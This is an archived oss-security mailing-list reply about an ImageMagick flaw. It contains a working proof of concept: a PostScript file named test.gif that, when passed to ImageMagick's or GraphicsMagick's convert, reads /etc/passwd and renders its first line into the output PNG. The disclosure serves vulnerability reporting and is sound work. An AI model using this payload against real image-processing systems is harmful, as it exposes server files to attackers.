X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1506" "Wednesday" "28" "September" "2016" "14:23:56" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkKmrvJ5KrBEWV=2RXA3MF5M-4c4_FvucO7vN_GESANCpg@mail.gmail.com>" "59" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016092821:23:56" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 28   59/1506  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15822 invoked by uid 550); 29 Sep 2016 03:14:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9227 invoked from network); 28 Sep 2016 21:24:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc;
        bh=NLNPjRWTvgYaRde4GhKqep9lft7n1fTwE4OhSh7BAsY=;
        b=PdXODRwpuCfATru2pUl/qbGwE0OuhHWQHzQw62OJVILHqt+auZFP3DtE6n2gI8Zyf0
         ilzx8NrpWGzp0aht+w6TBn5zMJ6XcajPuejEuB8YI6Dw6vw72Ugl/Bn3djinjypk+kB+
         3RrN+jwgQOkLZOTTLK0YsrKNqdiT4oS54UpmpPOTgB0+XKP1/ezLJ6GO0tP8E86R/aQt
         Z9e5j5gcPFan+6orwNRysCPh5ABsheHGTvC3uPaHB06gn6plnHlY6rEf7QvpNuS9YLCH
         0nH3dehO0gin7180YBJuVf0Axej1DyoDfinF0yjR6l766BYhC9kQVb6zZiuFBazM8sX0
         tJQA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc;
        bh=NLNPjRWTvgYaRde4GhKqep9lft7n1fTwE4OhSh7BAsY=;
        b=iPA6i5vsPXOlyqvGGY0CPwcIkkNG7ivCKvXTeviQgCpZiNosAw6ojwwnOVBWqhaQlj
         rg4vKYZiEmOJoUv/D7/pCTKJ6/v1Fug1s1TaQ1ylNwMofnYd0YCgjuutfXLMgVnEuuum
         UtYqxed3xssu8wXRkddTNZhZ5aTmovo84p7NNHgfZYHbqURKT0d37L259T9mfi4ATjq3
         7+YN1pukZAZhrWO/5f2ty/stiPIvaRKgLAjtywyqqJ1ZpGgVSL23VILSB4Rpa1Ouxyt7
         5eSk9WTxte0YMZeJUD7A/QMDK5Mt2EQXjJckRNSZbxkT9hN/GjqJtvTp5sEP1tvMHWxA
         tueA==
X-Gm-Message-State: AA6/9RlAWvrmZtdOw+G9tny5r/ebmdKIKmMcc1THRs2IMVIjgrpUWgvbQLmFLJPT8gfQ8K2MZKxtTy4RMaBXmHsJ
X-Received: by 10.31.135.14 with SMTP id j14mr19011008vkd.94.1475097857305;
 Wed, 28 Sep 2016 14:24:17 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com> <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
Message-ID: <CAJ_zFkKmrvJ5KrBEWV=2RXA3MF5M-4c4_FvucO7vN_GESANCpg@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Cc: bfriesen@graphicsmagick.org
Date: Wed, 28 Sep 2016 14:23:56 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Wed, Sep 28, 2016 at 1:52 PM, Tavis Ormandy <taviso@google.com> wrote:
>
> It seems obvious you can manipulate the output based on this. I'd be
> interested to hear why I'm wrong about this.
>

Oh, you can just do this:

$ cat test.gif
%!PS
/Font /Helvetica-Bold findfont def
/FontSize 12 def
Font FontSize scalefont setfont

/dumpname {
    dup             % copy filename
    dup             % copy filename
    print           % print filename
    (\n) print      % print newlinea
    status          % stat filename
    {
        (stat succeeded\n) print
        ( ctime:) print
        64 string cvs print
        ( atime:) print
        64 string cvs print
        ( size:) print
        64 string cvs print
        ( blocks:) print
        64 string cvs print
        (\n) print
        (\n) print
    }{
        (unable to stat\n\n) print
    } ifelse
    .libfile        % open as library
    {
        (.libfile returned file\n\n) print
        64 string readstring
        pop         % discard result (should proably test)
        dup         % copy read string
        print       % write to stdout
        % write to output
        newpath 0 0 moveto show showpage
        (\n) print
    }{
        (.libfile returned string\n) print
        print
        (\n) print
    } ifelse
} def

(/etc/passwd) /dumpname load 256 string filenameforall
$ convert test.gif png:test.png
<creates a file called test.png containing first line of /etc/passwd>

Also seems to work with gm convert.

Tavis.
